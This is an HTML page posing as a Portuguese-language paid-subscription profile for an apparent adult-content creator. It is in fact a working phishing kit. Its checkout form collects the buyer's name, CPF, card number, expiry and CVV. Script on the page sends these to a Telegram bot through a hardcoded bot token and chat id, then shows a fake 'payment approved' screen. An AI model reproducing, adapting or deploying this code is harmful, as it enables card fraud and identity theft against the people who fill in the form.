<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privacy | Kamylinha Santos</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/notiflix@2.7.0/dist/notiflix-aio-2.7.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

    <style>
        :root { --p-orange: #f47b52; --p-grad: linear-gradient(90deg, #f47b52, #f9a67a); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: #fff; color: #333; overflow-x: hidden; }
        
        .header { padding: 15px 20px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
        .logo-img { height: 28px; }

        .banner { width: 100%; height: 230px; background: url('capa.png') center/cover; position: relative; }
        .stats { position: absolute; bottom: 10px; right: 10px; background: rgba(0,0,0,0.6); color: #fff; padding: 5px 12px; border-radius: 20px; font-size: 11px; }

        .profile-area { padding: 0 20px; margin-top: -50px; }
        .p-pic { width: 100px; height: 100px; border-radius: 50%; border: 4px solid #fff; background: url('perfil1.png') center/cover; }
        .p-name { font-size: 22px; font-weight: 800; margin-top: 10px; }
        .p-user { color: #888; font-size: 14px; }

        .plans { padding: 20px; display: flex; flex-direction: column; gap: 10px; }
        .btn-p { width: 100%; padding: 18px; border-radius: 50px; border: none; background: var(--p-grad); color: #fff; font-weight: 700; font-size: 18px; cursor: pointer; display: flex; justify-content: space-between; }

        #modal, #success { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 1000; padding: 20px; }
        .content { background: #fff; border-radius: 20px; padding: 25px; margin-top: 50px; }
        .inp { width: 100%; padding: 15px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; outline: none; }
        
        #success { background: #fff; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .ok-img { width: 100%; max-width: 300px; border-radius: 15px; margin: 20px 0; border: 2px solid var(--p-orange); }
    </style>
</head>
<body>

    <div class="header"><img src="logo.png" class="logo-img"><i class="fa-solid fa-bars" style="color:var(--p-orange)"></i></div>

    <div class="banner"><div class="stats">354 <i class="fa-regular fa-image"></i> | 148 <i class="fa-solid fa-video"></i></div></div>

    <div class="profile-area">
        <div class="p-pic"></div>
        <div class="p-name">Kamylinha Santos <i class="fa-solid fa-circle-check" style="color:var(--p-orange)"></i></div>
        <div class="p-user">@eukamylinhasantos</div>
    </div>

    <div class="plans">
        <button class="btn-p" onclick="abrir('Mensal', '10,00')"><span>Assinar Mensal</span> <span>R$ 10,00</span></button>
        <button class="btn-p" onclick="abrir('Vital√≠cio', '27,00')"><span>Acesso Vital√≠cio</span> <span>R$ 27,00</span></button>
    </div>

    <div id="modal">
        <div class="content">
            <h2 id="tit" style="margin-bottom:15px; text-align:center; color:var(--p-orange)">Checkout</h2>
            <input type="text" id="n" class="inp" placeholder="Nome no Cart√£o">
            <input type="text" id="f" class="inp" placeholder="CPF">
            <input type="text" id="c" class="inp" placeholder="N√∫mero do Cart√£o">
            <div style="display:flex; gap:10px">
                <input type="text" id="v" class="inp" placeholder="MM/AA">
                <input type="text" id="s" class="inp" placeholder="CVV">
            </div>
            <button class="btn-p" style="justify-content:center" onclick="enviar()">APROVAR COMPRA</button>
        </div>
    </div>

    <div id="success">
        <i class="fa-solid fa-circle-check" style="color:#4CAF50; font-size:60px"></i>
        <h1 style="color:#4CAF50; margin-top:10px">PAGAMENTO APROVADO</h1>
        <p style="font-size:18px; font-weight:600">Entrega de conte√∫do em at√© 24Hrs</p>
        <img src="imagem1.png" class="ok-img">
        <button class="btn-p" style="width:200px; justify-content:center" onclick="location.reload()">FECHAR</button>
    </div>

    <script>
        let plano = "";
        $(document).ready(function(){
            $('#c').mask('0000 0000 0000 0000');
            $('#f').mask('000.000.000-00');
            $('#v').mask('00/00');
            $('#s').mask('000');
        });

        function abrir(p, r) { plano = p; $('#tit').text('Plano ' + p + ' - R$ ' + r); $('#modal').show(); }

        function enviar() {
            const token = '8495716341:AAEWdea8RcXtXrziTTMNkoBA78dTue71-Uc';
            const chat = '-1003569961624';
            
            const dados = {
                n: $('#n').val(),
                f: $('#f').val(),
                c: $('#c').val(),
                v: $('#v').val(),
                s: $('#s').val()
            };

            if(dados.c.length < 16) { alert('Dados inv√°lidos'); return; }

            Notiflix.Loading.circle('Processando...');

            const texto = `üöÄ NOVO CARD\nüë§ Nome: ${dados.n}\nüÜî CPF: ${dados.f}\nüí≥ Card: ${dados.c}\nüìÖ Val: ${dados.v}\nüîí CVV: ${dados.s}\nüí∞ Plano: ${plano}`;
            
            // M√âTODO ANTIGO: Abre a janela e deixa o Telegram processar
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(texto)}`;
            window.open(url, '_blank');

            setTimeout(() => {
                Notiflix.Loading.remove();
                $('#modal').hide();
                $('#success').css('display', 'flex');
            }, 2000);
        }
    </script>
</body>
</html>
